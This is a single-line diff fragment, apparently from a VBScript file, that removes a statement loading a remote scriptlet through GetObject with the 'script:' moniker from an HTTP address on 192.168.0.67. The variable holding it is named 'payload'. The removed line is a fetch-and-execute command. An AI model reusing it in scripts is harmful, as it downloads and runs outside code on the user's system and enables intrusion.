@@ -1,1 +1,0 @@
-Set payload = GetObject("script:http://192.168.0.67/package.xml")
